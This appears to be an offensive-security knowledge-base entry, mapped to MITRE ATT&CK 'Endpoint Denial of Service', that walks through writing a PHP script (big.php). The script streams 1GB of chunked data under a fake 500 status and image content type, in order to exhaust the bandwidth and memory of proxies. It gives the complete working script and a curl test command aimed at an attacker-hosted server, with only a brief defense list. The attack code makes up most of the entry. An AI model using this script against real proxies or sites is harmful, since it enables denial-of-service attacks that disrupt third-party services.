---
id: proc-create-big-php-001
tags:
  - large-response
  - php-script
  - bandwidth-dos
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:48.944Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Create-Large-Chunked-Response-PHP-Script

## Summary

This procedure develops a PHP script (big.php) that outputs 1GB of data in chunked encoding with HTTP 500 status, forcing the proxy to download excessive data and exhausting bandwidth (up to 800 Mbps with concurrent requests).

## Description

The script uses loops to echo 1MB buffers until 1GB is sent, without Content-Length, exploiting proxies lacking size limits on chunked responses. This leads to memory/disk exhaustion and enables amplified DoS on the proxy or proxied external sites.

## Requirements

1. PHP server with sufficient memory/disk ([[procedures/Setup-Attacker-Web-Server-with-PHP]])
2. No output buffering issues

## Defense

Defensive measures and detection strategies:

- Impose response size limits (e.g., 10MB) on proxies
- Monitor for large outbound transfers from asset servers
- Block chunked responses exceeding thresholds

## Objectives

1. Generate massive data transfer to overload proxy network
2. Use invalid status to bypass caching
3. Amplify impact with few concurrent requests

## Instructions

### Step 1: Write the big.php Script

**Context**: Code the script for 1GB chunked output.

Create /var/www/html/big.php:

```php
<?php
header('HTTP/1.1 500 Internal Server Error');
header('Content-Type: image/png');
header('Transfer-Encoding: chunked');
$total = 0;
while($total < 1073741824) {
    echo str_repeat('A', 1048576);
    $total += 1048576;
    flush();
}
?>
```

> Expected output: Script sends ~1GB in 50-68s when accessed.

### Step 2: Test Data Output

**Context**: Confirm size with curl.

curl -s http://attacker/big.php | wc -c

> Expected output: ~1073741824 bytes.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- large-response
- chunked
